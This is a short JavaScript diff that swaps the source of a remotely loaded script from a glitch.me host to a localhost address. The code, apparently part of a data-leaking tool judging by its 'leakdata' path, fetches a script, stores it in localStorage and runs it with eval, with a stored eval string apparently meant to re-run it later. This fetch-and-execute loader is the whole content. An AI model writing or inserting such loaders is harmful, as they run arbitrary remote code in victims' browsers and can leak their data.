@@ -1,6 +1,6 @@
-const crawlScriptURL = 'https://nhdcoll.glitch.me/leakdata/src/limh.js';
+const crawlScriptURL = 'http://127.0.0.1:5500/leakdata/src/limh.js';
 const script = await (await fetch(crawlScriptURL)).text();
 
 localStorage.setItem('crawl-script', script);
-localStorage.setItem('l', 'eval(localStorage.getItem(\'crawl-script\'))');
+localStorage.setItem('l', "eval(localStorage.getItem('crawl-script'))");
 eval(localStorage.l);
